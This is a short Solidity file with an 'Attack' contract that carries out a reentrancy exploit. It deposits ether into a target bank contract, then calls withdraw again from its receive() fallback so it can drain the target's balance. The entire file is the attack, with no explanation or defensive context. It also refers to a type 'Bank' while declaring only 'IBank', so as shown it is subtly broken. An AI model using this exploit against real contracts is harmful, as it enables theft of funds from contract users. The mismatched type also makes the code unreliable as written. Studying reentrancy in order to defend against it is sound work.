contract Attack {
    Bank public target;
    address public owner;

    constructor(address _target) {
        target = Bank(_target);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value > 0);
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}

interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}